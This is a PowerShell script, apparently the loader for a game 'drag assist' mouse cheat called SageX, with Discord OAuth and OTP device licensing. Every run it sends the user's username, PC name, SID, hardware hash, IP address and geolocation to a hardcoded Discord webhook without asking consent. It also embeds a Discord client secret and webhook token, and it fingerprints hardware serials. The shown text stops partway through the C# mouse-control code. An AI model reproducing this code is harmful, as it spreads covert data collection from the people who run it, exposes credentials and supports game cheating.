# Discord Verification and SageX Drag Assist
# Complete Working Implementation

# Clear the host
Clear-Host

# ==================== DISCORD VERIFICATION ====================
function Invoke-DiscordVerification {
    # Configuration
    $ClientId = "1382248776315568148"
    $ClientSecret = "Y6yQB6a9pCXP0d4vobTwmK7d48I3caYz"
    $RedirectUri = "http://localhost:5000/callback"
    $RequiredGuildId = "1248959541295452233"
    $ConfigFilePath = "$env:APPDATA\SageX Regedit\user_config.json"
    $VerificationValidDays = 30

    # Load or create config
    $config = Get-DiscordConfig -Path $ConfigFilePath

    # Check if already verified
    if ($config.IsVerified -and ((Get-Date).ToUniversalTime() - $config.LastVerified).TotalDays -le $VerificationValidDays) {
        Write-Host "Previous verification still valid." -ForegroundColor Green
        return $true
    }

    Write-Host "Starting verification process..." -ForegroundColor Yellow
    Write-Host "You need to be a member of our Discord server to continue."
    
    try {
        # Open browser for authentication with all required scopes
        $authUrl = "https://discord.com/oauth2/authorize?client_id=$ClientId&redirect_uri=$RedirectUri&response_type=code&scope=identify+guilds+guilds.join&state=$RequiredGuildId&prompt=none"
        Write-Host "`nPlease visit this URL in your browser:"
        Write-Host $authUrl -ForegroundColor Cyan
        Write-Host "`nAfter authenticating, you'll get a code. Paste it below."

        # Get the code from user input
        $code = Read-Host -Prompt "`nEnter the authorization code from Discord"
        
        if ([string]::IsNullOrEmpty($code)) {
            Write-Host "Authentication failed: No code received" -ForegroundColor Red
            return $false
        }

        Write-Host "`nAuthenticating with Discord..." -ForegroundColor Yellow
        $token = Get-DiscordToken -Code $code -ClientId $ClientId -ClientSecret $ClientSecret -RedirectUri $RedirectUri

        if (-not $token) {
            Write-Host "Failed to obtain access token" -ForegroundColor Red
            return $false
        }

        # Debug output
        Write-Host "`n[DEBUG] Token Type: $($token.token_type)" -ForegroundColor DarkGray
        Write-Host "[DEBUG] Scopes: $($token.scope)" -ForegroundColor DarkGray

        Write-Host "`nChecking server membership..." -ForegroundColor Yellow
        $isMember = Test-DiscordGuildMembership -AccessToken $token.access_token -GuildId $RequiredGuildId

        if ($isMember) {
            $config.IsVerified = $true
            $config.LastVerified = (Get-Date).ToUniversalTime()
            Set-DiscordConfig -Config $config -Path $ConfigFilePath
            Write-Host "Verification successful!" -ForegroundColor Green
            return $true
        }

        Write-Host "`n[!] Verification failed. Possible reasons:" -ForegroundColor Red
        Write-Host "- You haven't joined our Discord server" -ForegroundColor Yellow
        Write-Host "- The bot can't see your membership (try rejoining)" -ForegroundColor Yellow
        Write-Host "- There may be a delay in Discord's systems (try again in 5 minutes)" -ForegroundColor Yellow
        
        return $false
    }
    catch {
        Write-Host "Error during verification: $_" -ForegroundColor Red
        return $false
    }
}

function Get-DiscordConfig {
    param($Path)
    
    try {
        if (Test-Path $Path) {
            $json = Get-Content $Path -Raw
            return $json | ConvertFrom-Json
        }
    }
    catch {
        Write-Host "Note: Could not load config - $_" -ForegroundColor Yellow
    }

    return [PSCustomObject]@{
        IsVerified = $false
        LastVerified = [DateTime]::MinValue
    }
}

function Set-DiscordConfig {
    param($Config, $Path)
    
    try {
        $json = $Config | ConvertTo-Json
        $dir = Split-Path $Path -Parent
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
        $json | Out-File $Path -Force
    }
    catch {
        Write-Host "Warning: Could not save config - $_" -ForegroundColor Yellow
    }
}

function Get-DiscordToken {
    param($Code, $ClientId, $ClientSecret, $RedirectUri)
    
    $body = @{
        client_id = $ClientId
        client_secret = $ClientSecret
        grant_type = "authorization_code"
        code = $Code
        redirect_uri = $RedirectUri
        scope = "identify guilds guilds.join"
    }

    try {
        $response = Invoke-RestMethod -Uri "https://discord.com/api/oauth2/token" `
            -Method Post `
            -Body $body `
            -ContentType "application/x-www-form-urlencoded"
        return $response
    }
    catch {
        Write-Host "Discord API error: $($_.Exception.Response.StatusDescription)" -ForegroundColor Red
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $reader.BaseStream.Position = 0
            $reader.DiscardBufferedData()
            $responseBody = $reader.ReadToEnd()
            Write-Host "Detailed error: $responseBody" -ForegroundColor Red
        }
        return $null
    }
}

function Test-DiscordGuildMembership {
    param($AccessToken, $GuildId)
    
    try {
        $headers = @{
            Authorization = "Bearer $AccessToken"
        }

        # First verify we can get user identity
        $user = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
        if (-not $user) {
            Write-Host "Failed to verify user identity" -ForegroundColor Red
            return $false
        }

        # Then get guilds
        $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me/guilds" -Headers $headers -ErrorAction Stop
        $isMember = ($guilds | Where-Object { $_.id -eq $GuildId }) -ne $null

        if (-not $isMember) {
            Write-Host "User is in these guilds: $($guilds.id -join ', ')" -ForegroundColor Yellow
        }

        return $isMember
    }
    catch {
        Write-Host "Error checking guild membership: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# ==================== KEY WAIT FUNCTION ====================
function Wait-AnyKey {
    try {
        if ($Host.Name -eq 'ConsoleHost' -and $Host.UI.RawUI -and 
            (Get-Member -InputObject $Host.UI.RawUI -Name ReadKey -ErrorAction SilentlyContinue)) {
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        else {
            Write-Host "Press any key to continue..."
            [Console]::ReadKey($true) | Out-Null
        }
    }
    catch {
        Write-Host "Press Enter to continue..."
        [Console]::ReadLine() | Out-Null
    }
}

# ==================== SID COLLECTION ====================
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    $sid = "Unavailable"
}

# ==================== WEBHOOK LOGGING ====================
$webhookUrl = "https://discord.com/api/webhooks/1381495228862824581/aOyluJkqwSF814T5Kw6ocSLcAHo6JXWi0lxmY7_pTSRrS4_jY4vCR_iUFS3_YU9-pY7b"

function Send-WebhookMessage {
    param(
        [string]$message,
        [string]$status = "info"
    )
    
    try {
        $user = $env:USERNAME
        $pcName = $env:COMPUTERNAME
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
        $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

        try {
            $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
            $ip = $ipInfo.query
            $country = $ipInfo.country
            $region = $ipInfo.regionName
            $city = $ipInfo.city
        } catch {
            $ip = "Unavailable"
            $country = "Unavailable"
            $region = "Unavailable"
            $city = "Unavailable"
        }

        $color = switch ($status) {
            "success" { 65280 }   # Green
            "error"   { 16711680 } # Red
            "warning" { 16776960 } # Yellow
            default   { 4886754 }  # Blue
        }

        $embed = @{
            title = "<:Dead:1346705076626002033> SageX Executed - $status".ToUpper()
            color = $color
            timestamp = (Get-Date).ToString("o")
            fields = @(
                @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
                @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
                @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
                @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
                @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false },
                @{ name = "Status Message"; value = $message; inline = $false }
            )
        }

        $payload = @{
            username = "SageX Logger"
            embeds = @($embed)
        } | ConvertTo-Json -Depth 10

        $headers = @{
            "Content-Type" = "application/json"
        }

        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

# Test webhook connection
$webhookTest = Send-WebhookMessage -message "Initial connection test" -status "info"
if (-not $webhookTest) {
    Write-Host "[!] Webhook initialization failed. Continuing without webhook logging." -ForegroundColor Yellow
}

# ==================== OTP VERIFICATION SYSTEM ====================
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-MachineFingerprint {
    try {
        $cpuId = (Get-WmiObject Win32_Processor -ErrorAction Stop).ProcessorId
        $biosId = (Get-WmiObject Win32_BIOS -ErrorAction Stop).SerialNumber
        $diskId = (Get-WmiObject Win32_DiskDrive -ErrorAction Stop).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction Stop | 
                      Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
        
        $combinedId = "$cpuId$biosId$diskId$macAddress"
        $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($combinedId))
        $hashedId = [System.BitConverter]::ToString($hash) -replace "-", ""
        
        return $hashedId.Substring(0, 32)
    }
    catch {
        $errorMsg = "Error generating machine fingerprint: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    try {
        $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $bytes = New-Object byte[]($Length)
        $rng.GetBytes($bytes)
        
        $otp = -join ($bytes | ForEach-Object {
            $validChars[$_ % $validChars.Length]
        })
        
        return $otp
    }
    catch {
        $errorMsg = "Error generating OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            $warningMsg = "Empty OTP database received"
            Write-Host "[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            return $false
        }
        
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        return ($remoteData -match $pattern)
    }
    catch {
        $errorMsg = "Failed to verify OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        return $false
    }
}

function Initialize-OTPSystem {
    try {
        $appDataFolder = "$env:APPDATA\SageX Regedit"
        if (-not (Test-Path $appDataFolder)) {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        
        $LocalStoragePath = "$appDataFolder\otp.ini"
        $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
        $machineFingerprint = Get-MachineFingerprint
        
        if (Test-Path $LocalStoragePath) {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            if (-not (Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL)) {
                $errorMsg = "Device not authorized. Fingerprint: $machineFingerprint | OTP: $localOTP"
                Write-Host "`n[!] $errorMsg" -ForegroundColor Red
                Send-WebhookMessage -message $errorMsg -status "error"
                Write-Host "[!] Please contact support." -ForegroundColor Red
                Start-Sleep 15
                exit
            }
            
            Send-WebhookMessage -message "OTP verification successful" -status "success"
            return $true
        }
        else {
            $newOTP = Generate-SecureOTP -Length 12
            $otpContent = @(
                "[OTP]",
                "fingerprint=$machineFingerprint",
                "otp=$newOTP",
                "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            )
            
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            $warningMsg = "FIRST-TIME SETUP REQUIRED. Fingerprint: $machineFingerprint | OTP: $newOTP"
            Write-Host "`n[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            Write-Host "`n[!] Please register this device with the information above" -ForegroundColor Yellow
            Write-Host "[!] Send this information to the developer" -ForegroundColor Yellow
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Gray
            Start-Sleep 10
            exit
        }
    }
    catch {
        $errorMsg = "OTP System Error: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

# ==================== DRAG ASSIST IMPLEMENTATION ====================
$csharpCode = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

public class SageXDragAssist {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleTitle(string lpConsoleTitle);

    [DllImport("kernel32.dll")]
    public static extern bool Beep(int dwFreq, int dwDuration);

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }

    public static bool Enabled = true;
    public static int Strength = 5;
    public static int Smoothness = 5;
    public static int AssistLevel = 5;
    public static int Frames = 0;
    public static double AverageLatency = 0;
    public static Stopwatch frameTimer = new Stopwatch();

    public static void UpdateConsoleTitle() {
        string status = Enabled ? "ACTIVE" : "INACTIVE";
        string title = string.Format(
            "SageX Drag Assist | Status: {0} | Strength: {1} | Smoothness: {2} | Assist: {3} | FPS: {4} | Latency: {5:0.00}ms",
            status, Strength, Smoothness, AssistLevel, Frames, AverageLatency
        );
